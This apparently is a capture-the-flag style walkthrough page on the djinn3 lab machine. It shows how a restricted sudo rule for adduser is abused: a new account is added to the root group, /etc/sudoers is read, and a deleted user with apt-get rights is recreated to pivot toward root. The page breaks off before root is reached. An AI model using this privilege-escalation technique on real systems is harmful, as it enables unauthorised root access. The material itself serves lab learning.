---
layout: default
title: Add User
parent: Sudo
nav_order: 5
---

# Add user

---

## Check Sudo Permissions

```bash
saint@djinn3:~$ sudo -l
Matching Defaults entries for saint on djinn3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saint may run the following commands on djinn3:
    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

```

### Add User with Sudo Permissions

```bash
saint@djinn3:~$ sudo /usr/sbin/adduser kamino --uid 0
adduser: The UID 0 is already in use.

```

The UID of 0 is already in use.

Instead add user with --gid 0

```bash
saint@djinn3:~$ sudo /usr/sbin/adduser kamino --gid 0
Adding user `kamino' ...
Adding new user `kamino' (1003) with group `root' ...
Creating home directory `/home/kamino' ...
Copying files from `/etc/skel' ...
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
Changing the user information for kamino
Enter the new value, or press ENTER for the default
        Full Name []:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n]

kamino@djinn3:/home/saint$ id
uid=1003(kamino) gid=0(root) groups=0(root)


```

We are getting close, but we still are not root because we don't have the effective UID of 0.

Let's see if we can access the Sudoers file.

```bash
kamino@djinn3:/home/saint$ cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:
# If you need a huge list of used numbers please install the nmap package.

saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

jason ALL=(root) PASSWD: /usr/bin/apt-get
#includedir /etc/sudoers.d

```

At the very bottom we can see the user _jason_ that has root access to the command _/usr/bin/apt-get_

Since this user is not currently in _/etc/passwd_ they must been a deleted user.

If we can _su_ to _jason_ then we can pivot to root.

Switch back to _saint_ and add _jason_ back with GID 0

```bash
kamino@djinn3:/home/saint$ exit
exit
saint@djinn3:~$ sudo /usr/sbin/adduser jason --gid 0
Adding user `jason' ...
Adding new user `jason' (1004) with group `root' ...
Creating home directory `/home/jason' ...
Copying files from `/etc/skel' ...
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
Changing the user information for jason
Enter the new value, or press ENTER for the default
        Full Name []:
        Room Number []:
        Work Phone []:
        Home Phone []:
        Other []:
Is the information correct? [Y/n]
```
